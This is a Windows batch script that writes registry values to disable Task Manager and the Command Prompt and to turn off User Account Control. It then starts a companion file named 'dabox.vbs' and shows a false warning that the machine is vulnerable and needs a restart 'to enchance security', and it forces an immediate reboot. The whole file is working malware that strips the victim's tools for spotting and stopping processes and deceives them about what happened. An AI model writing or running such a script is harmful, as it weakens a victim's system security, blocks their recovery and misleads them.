@echo off

REM Disable Task Manager
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f

cls
echo Operation Completed Successfully.
timeout /t 2 

REM Disable Command Prompt
REG ADD "HKCU\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d "1" /f

cls
echo Operation Completed Successfully.
timeout /t 2 /nobreak >nul

REM Disable UAC
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f

cls
echo Operation Completed Successfully.
timeout /t 2 
cls
cd %cd%
start dabox.vbs
title Action Needed!
echo Your Attention Is now needed and FAST! Your Device is now vurnerable to diffrent attacks. Please restart your device to enchance security on your device. Press any key to restart your pc.
pause
shutdown /r /t 0
exit

